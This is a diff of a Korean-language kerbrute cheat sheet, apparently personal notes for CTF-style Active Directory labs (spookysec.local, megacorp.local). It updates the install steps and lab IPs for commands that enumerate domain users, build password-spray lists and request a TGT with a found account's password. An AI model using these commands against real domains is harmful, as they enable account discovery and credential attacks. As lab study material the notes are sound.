@@ -4,13 +4,9 @@
 
 ```bash
 # 최신 버전 확인 후 다운로드
-git clone https://github.com/ropnop/kerbrute.git
-cd kerbrute
-make linux
-
-# 또는 직접 실행 가능한 바이너리 (최신)
-wget $(curl -s https://api.github.com/repos/ropnop/kerbrute/releases/latest | grep -o "https.*kerbrute_linux_amd64")
-chmod +x kerbrute_linux_amd64
+wget https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_linux_amd64 -O kerbrute
+chmod +x kerbrute
+sudo mv kerbrute /usr/local/bin/
 ```
 
 ## 사용법
@@ -19,8 +15,8 @@ chmod +x kerbrute_linux_amd64
 
 ```bash
 # 1) 사용자 목록으로 확인 (가장 많이 쓰는 형식)
-# uerenum -> 사용자 존재여부를 확인할 때 사용하는 고정 옵션
-./kerbrute userenum --dc 10.10.233.27 -d spookysec.local -o found_users.txt /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
+# uerenum -> 사용자 존재여부를 확인할 때 사용하는 고정 타입 옵션
+./kerbrute userenum --dc 10.10.206.91 -d spookysec.local -o found_users.txt /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
 
 # 2) 빠른 확인 (내장 워드리스트)
 ./kerbrute userenum --dc 10.10.10.175 -d megacorp.local /opt/useful/SecLists/Usernames/Names/names.txt
@@ -110,7 +106,7 @@ awk '{print $1":Summer2023!"}' users.txt >> combos.txt
 ./kerbrute userenum --dc 10.10.10.175 --domain spookysec.local userlist.txt
 
 # 2) 획득한 계정으로 인증 및 티켓 저장
-./kerbrute -d spookysec.local --dc 10.10.233.27 -t 1 --user svc_backup --password backup2023 --tgt /tmp/svc_backup.ccache
+./kerbrute -d spookysec.local --dc 10.10.206.91 -t 1 --user svc_backup --password backup2023 --tgt /tmp/svc_backup.ccache
 
 # 3) TGT 저장 후 환경변수 설정
 export KRB5CCNAME=/tmp/svc_backup.ccache
